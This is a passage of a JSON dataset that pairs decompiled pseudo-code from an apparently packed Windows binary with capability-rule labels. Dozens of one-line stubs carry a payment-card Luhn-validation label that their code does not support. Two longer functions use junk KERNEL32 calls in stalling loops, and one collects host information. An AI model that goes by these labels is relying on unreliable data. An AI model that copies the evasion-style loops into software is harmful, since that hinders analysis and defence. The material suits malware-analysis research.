            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040af20(void)\n\n{\n    fcn.0040d530(4);\n    return;\n}\n",
        "token_count": 27
    },
    "0040b0e2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b0e2(void)\n\n{\n    fcn.0040d530(4);\n    return;\n}\n",
        "token_count": 29
    },
    "0040b771": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b771(void)\n\n{\n    fcn.0040d530(4);\n    return;\n}\n",
        "token_count": 27
    },
    "0040be36": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040be36(void)\n\n{\n    fcn.0040d530(4);\n    return;\n}\n",
        "token_count": 27
    },
    "0040c2d5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040c2d5(void)\n\n{\n    fcn.0040d530(4);\n    return;\n}\n",
        "token_count": 29
    },
    "0040c436": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040c436(void)\n\n{\n    fcn.0040d530(4);\n    return;\n}\n",
        "token_count": 27
    },
    "0040c70b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040c70b(void)\n\n{\n    fcn.0040d530(4);\n    return;\n}\n",
        "token_count": 28
    },
    "0040ca3a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040ca3a(void)\n\n{\n    fcn.0040d530(4);\n    return;\n}\n",
        "token_count": 28
    },
    "0040d16b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040d16b(void)\n\n{\n    fcn.0040d530(0xe);\n    return;\n}\n",
        "token_count": 29
    },
    "0040d4c6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040d4c6(void)\n\n{\n    fcn.0040d530(10);\n    return;\n}\n",
        "token_count": 29
    },
    "004105e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004105e0(uint arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    puVar1 = fcn.004106c0();\n    *puVar1 = arg_8h;\n    uVar2 = fcn.00410610(arg_8h);\n    puVar1 = fcn.00410690();\n    *puVar1 = uVar2;\n    return;\n}\n",
        "token_count": 98
    },
    "004108ef": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004108ef(uint arg_8h)\n\n{\n    int32_t unaff_EBP;\n    \n    fcn.0041d530(*(unaff_EBP + 8));\n    return;\n}\n",
        "token_count": 48
    },
    "00410ba0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00410ba0(void)\n\n{\n    fcn.00410bc0(1);\n    return;\n}\n",
        "token_count": 27
    },
    "00410d07": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00410d07(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_20h;\n    \n    fcn.004103d0(*(unaff_EBP + -0x20), *(*0x7e0614 + *(unaff_EBP + -0x20) * 4));\n    return;\n}\n",
        "token_count": 75
    },
    "00410d34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00410d34(void)\n\n{\n    fcn.0040d530(1);\n    return;\n}\n",
        "token_count": 27
    },
    "00411411": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00411411(void)\n\n{\n    fcn.0040d530(0xd);\n    return;\n}\n",
        "token_count": 27
    },
    "0041168e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041168e(void)\n\n{\n    fcn.0040d530(0xd);\n    return;\n}\n",
        "token_count": 28
    },
    "004125d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004125d8(void)\n\n{\n    fcn.0040d530(0xc);\n    return;\n}\n",
        "token_count": 28
    },
    "00412714": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00412714(void)\n\n{\n    fcn.0040d530(0xc);\n    return;\n}\n",
        "token_count": 27
    },
    "00412c80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00412c80(void)\n\n{\n    fcn.0040d530(0xd);\n    return;\n}\n",
        "token_count": 28
    },
    "00412cd6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00412cd6(void)\n\n{\n    fcn.0040d530(0xc);\n    return;\n}\n",
        "token_count": 28
    },
    "00412f58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00412f58(void)\n\n{\n    fcn.0040d530(0xd);\n    return;\n}\n",
        "token_count": 28
    },
    "00412fc5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00412fc5(void)\n\n{\n    fcn.0040d530(0xc);\n    return;\n}\n",
        "token_count": 28
    },
    "00414db0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00414db0(void)\n\n{\n    fcn.0040d4f0(8);\n    return;\n}\n",
        "token_count": 29
    },
    "00415ee0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00415ef1)\n// WARNING: Removing unreachable block (ram,0x00415ef7)\n// WARNING: Removing unreachable block (ram,0x00415ef9)\n\nvoid fcn.00415ee0(void)\n\n{\n    return;\n}\n",
        "token_count": 64
    },
    "00416392": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00416392(void)\n\n{\n    fcn.0040d530(4);\n    return;\n}\n",
        "token_count": 26
    },
    "00416ace": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00416ace(void)\n\n{\n    fcn.0040d530(4);\n    return;\n}\n",
        "token_count": 26
    },
    "00416e58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00416e58(void)\n\n{\n    fcn.0040d530(4);\n    return;\n}\n",
        "token_count": 27
    },
    "004170b5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004170b5(void)\n\n{\n    fcn.0040d530(4);\n    return;\n}\n",
        "token_count": 27
    },
    "004171c1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004171c1(void)\n\n{\n    fcn.0040d530(4);\n    return;\n}\n",
        "token_count": 27
    },
    "00419875": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00419875(void)\n\n{\n    fcn.0040d530(0xf);\n    return;\n}\n",
        "token_count": 27
    },
    "0041a08a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041a08a(void)\n\n{\n    fcn.0040d530(0xf);\n    return;\n}\n",
        "token_count": 29
    },
    "0041a6f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041a6f0(void)\n\n{\n    fcn.00412830(*0x7e0064);\n    return;\n}\n",
        "token_count": 33
    },
    "0041d1a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041d1a8(void)\n\n{\n    fcn.0040d530(1);\n    return;\n}\n",
        "token_count": 29
    },
    "0041d4e1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041d4e1(void)\n\n{\n    fcn.0040d530(10);\n    return;\n}\n",
        "token_count": 29
    },
    "0041d755": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d755(uint arg_8h)\n\n{\n    int32_t unaff_EBP;\n    \n    fcn.0041d530(*(unaff_EBP + 8));\n    return;\n}\n",
        "token_count": 49
    },
    "0041d97f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d97f(uint arg_8h)\n\n{\n    int32_t unaff_EBP;\n    \n    fcn.0041d530(*(unaff_EBP + 8));\n    return;\n}\n",
        "token_count": 50
    },
    "0041e4f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e4f0(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0041e510(arg_8h, arg_ch, 0x43e9d4);\n    return;\n}\n",
        "token_count": 53
    },
    "0041eb40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041eb40(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0041e510(arg_8h, arg_ch, 0x43e9ec);\n    return;\n}\n",
        "token_count": 50
    },
    "00424ba1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00424ba1(uint arg_8h)\n\n{\n    int32_t unaff_EBP;\n    \n    fcn.00410370(*(unaff_EBP + 8));\n    return;\n}\n",
        "token_count": 48
    },
    "00425314": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00425314(uint arg_8h)\n\n{\n    int32_t unaff_EBP;\n    \n    fcn.0041d530(*(unaff_EBP + 8));\n    return;\n}\n",
        "token_count": 48
    },
    "00429edc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429edc(uint arg_8h)\n\n{\n    int32_t unaff_EBP;\n    \n    fcn.0041d530(*(unaff_EBP + 8));\n    return;\n}\n",
        "token_count": 49
    },
    "00409864": {
        "rules": [
            "get file attributes"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpNumberOfEventsRead\n\nuint fcn.00409864(void)\n\n{\n    int32_t iVar1;\n    uint lpBuffer;\n    uint var_1418h;\n    uint lpStruct;\n    uint lpString1;\n    uint var_818h;\n    uint var_418h;\n    uint uStack108;\n    uint uStack104;\n    uint *puStack100;\n    uint *puStack96;\n    uint uStack92;\n    uint *puStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint *puStack68;\n    uint *puStack64;\n    uint *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uint *puStack36;\n    uint uStack32;\n    uint var_18h;\n    uint uStack24;\n    uint *puStack20;\n    uint uStack16;\n    uint lpNumberOfEventsRead;\n    \n    lpNumberOfEventsRead = 0x409871;\n    fcn.00409f00();\n    iVar1 = 0;\n    do {\n        if (*0x7dde1c == 0x47) {\n            uStack16 = 0;\n            puStack20 = NULL;\n            uStack24 = 0;\n            var_18h = 0;\n            uStack32 = 0x40988a;\n            (*_sym.imp.KERNEL32.dll_SetCalendarInfoW)();\n            uStack32 = 0x4015c4;\n            puStack36 = 0x409895;\n            (*_sym.imp.KERNEL32.dll_SetCurrentDirectoryA)();\n            puStack36 = 0x4015d4;\n            uStack40 = 0x4098a0;\n            (*_sym.imp.KERNEL32.dll_AddAtomW)();\n            uStack40 = 0;\n            uStack44 = 0x4098a7;\n            (*_sym.imp.KERNEL32.dll_DebugBreakProcess)();\n            uStack44 = 0;\n            puStack48 = &fcn.00409864::lpBuffer;\n            uStack52 = 0;\n            uStack56 = 0x4015e8;\n            puStack60 = 0x4098bb;\n            (*_sym.imp.KERNEL32.dll_GetFullPathNameW)();\n            puStack60 = NULL;\n            puStack64 = &fcn.00409864::lpString1;\n            puStack68 = 0x4098c9;\n            (*_sym.imp.KERNEL32.dll_lstrcatW)();\n            puStack68 = NULL;\n            uStack72 = 0;\n            uStack76 = 0;\n            uStack80 = 0;\n            uStack84 = 0;\n            puStack88 = 0x4098d4;\n            (*_sym.imp.KERNEL32.dll_GetQueuedCompletionStatus)();\n            puStack88 = NULL;\n            uStack92 = 0;\n            puStack96 = &fcn.00409864::var_418h;\n            puStack100 = NULL;\n            uStack104 = 0x4098e4;\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasA)();\n        }\n        if (iVar1 == 0x4caa) {\n            *0x7dde1c = *0x42e53c;\n            break;\n        }\n        if (*0x7dde1c == 0xf) {\n            uStack16 = 0;\n            puStack20 = &fcn.00409864::var_418h;\n            uStack24 = 0;\n            var_18h = 0x409904;\n            (*_sym.imp.KERNEL32.dll__hwrite)();\n            var_18h = 0;\n            uStack32 = 0;\n            puStack36 = &fcn.00409864::lpStruct;\n            uStack40 = 0;\n            uStack44 = 0;\n            puStack48 = 0x409915;\n            (*_sym.imp.KERNEL32.dll_GetPrivateProfileStructA)();\n            puStack48 = NULL;\n            uStack52 = 0;\n            uStack56 = 0;\n            puStack60 = 0x40991e;\n            (*_sym.imp.KERNEL32.dll_EnumTimeFormatsA)();\n            puStack60 = &fcn.00409864::lpNumberOfEventsRead;\n            puStack64 = NULL;\n            puStack68 = &fcn.00409864::var_18h;\n            uStack72 = 0;\n            uStack76 = 0x40992e;\n            (*_sym.imp.KERNEL32.dll_ReadConsoleInputA)();\n            uStack76 = 0;\n            uStack80 = 0;\n            uStack84 = 0x409936;\n            (*_sym.imp.KERNEL32.dll_GetComputerNameW)();\n            uStack84 = 0;\n            puStack88 = &fcn.00409864::var_818h;\n            uStack92 = 0;\n            puStack96 = 0x409945;\n            (*_sym.imp.KERNEL32.dll_GetAtomNameA)();\n            puStack96 = NULL;\n            puStack100 = &fcn.00409864::var_1418h;\n            uStack104 = 0x409953;\n            (*_sym.imp.KERNEL32.dll_GetSystemWindowsDirectoryA)();\n            uStack104 = 0;\n            uStack108 = 0x40995a;\n            (*_sym.imp.KERNEL32.dll_GetFileAttributesA)();\n        }\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 0x2443831);\n    iVar1 = 0;\n    do {\n        if (*0x7dde1c == 0x15) {\n            uStack16 = 0x409984;\n            (*_sym.imp.KERNEL32.dll_GetThreadLocale)();\n            uStack16 = 0;\n            puStack20 = NULL;\n            uStack24 = 0;\n            var_18h = 0;\n            uStack32 = 0;\n            puStack36 = 0x40998f;\n            (*_sym.imp.KERNEL32.dll_GetMailslotInfo)();\n            puStack36 = NULL;\n            uStack40 = 0;\n            uStack44 = 0x409997;\n            (*_sym.imp.KERNEL32.dll_SetProcessPriorityBoost)();\n        }\n        if (iVar1 == 0x89622) {\n            uStack16 = 0x401610;\n            puStack20 = 0x7dde20;\n            uStack24 = 0x4099af;\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)();\n        }\n        if (iVar1 == 0x1736) {\n            *0x7df9a0 = *0x42e008;\n        }\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 0x79a862);\n    uStack16 = 0x4099cf;\n    fcn.004092a5();\n    return 0;\n}\n",
        "token_count": 1526
    },
    "004090b1": {
        "rules": [
            "get OS version",
            "get hostname",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004090b1(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    uchar auStack8404 [2048];\n    uint lpBuffer;\n    uint var_10d0h;\n    uint var_8d0h;\n    uint lpVersionInformation;\n    uint uStack140;\n    uint uStack136;\n    uchar *puStack132;\n    uint uStack128;\n    uint *puStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint *puStack68;\n    uint *puStack64;\n    uint uStack60;\n    uint lpDCB;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint *lpCommTimeouts;\n    uint var_14h;\n    uint *puStack20;\n    uint *puStack16;\n    uint var_4h;\n    \n    var_4h = 0x4090be;\n    fcn.00409f00();\n    if (*0x7dde1c == 0x37) {\n        puStack16 = &fcn.004090b1::lpCommTimeouts;\n        puStack20 = &fcn.004090b1::lpDCB;\n        var_14h = 0;\n        lpCommTimeouts = 0x4090ea;\n        (*_sym.imp.KERNEL32.dll_BuildCommDCBAndTimeoutsW)();\n        lpCommTimeouts = &fcn.004090b1::lpBuffer;\n        uStack32 = 0;\n        uStack36 = 0x4090f8;\n        (*_sym.imp.KERNEL32.dll_GetTempPathW)();\n        uStack36 = 0;\n        uStack40 = 0x4090ff;\n        (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n        pcVar1 = _sym.imp.KERNEL32.dll_GetComputerNameExW;\n        uStack40 = 0;\n        uStack44 = 0;\n        uStack48 = 0;\n        uStack52 = 0x40910a;\n        (*_sym.imp.KERNEL32.dll_GetComputerNameExW)();\n        uStack52 = 0x401460;\n        lpDCB = 0x401488;\n        uStack60 = 0;\n        puStack64 = 0x40911b;\n        (*_sym.imp.KERNEL32.dll_FindResourceW)();\n        puStack64 = &fcn.004090b1::var_4h;\n        puStack68 = &fcn.004090b1::var_8d0h;\n        uStack72 = 0;\n        uStack76 = 0x409129;\n        (*pcVar1)();\n        uStack76 = 0;\n        puStack80 = &fcn.004090b1::var_10d0h;\n        uStack84 = 0;\n        uStack88 = 0x409138;\n        (*_sym.imp.KERNEL32.dll_GlobalGetAtomNameW)();\n        uStack88 = 0;\n        uStack92 = 0;\n        uStack96 = 0;\n        uStack100 = 0x409141;\n        (*_sym.imp.KERNEL32.dll_VirtualQuery)();\n        uStack100 = 0;\n        uStack104 = 0;\n        uStack108 = 0x409149;\n        (*_sym.imp.KERNEL32.dll_SetProcessPriorityBoost)();\n        uStack108 = 0;\n        uStack112 = 0x409150;\n        (*_sym.imp.KERNEL32.dll_LocalFree)();\n        uStack112 = 0;\n        uStack116 = 0;\n        uStack120 = 0;\n        puStack124 = &fcn.004090b1::lpVersionInformation;\n        uStack128 = 0x409160;\n        (*_sym.imp.KERNEL32.dll_VerifyVersionInfoA)();\n        uStack128 = 0;\n        puStack132 = &stack0xffffdf2c;\n        uStack136 = 0x4014b0;\n        uStack140 = 0x409173;\n        (*_sym.imp.KERNEL32.dll_GetProfileSectionW)();\n    }\n    *(*0x7da318 + arg_8h) = *(*0x7df9a0 + 0x38d6 + arg_8h);\n    return;\n}\n",
        "token_count": 1028
    }
}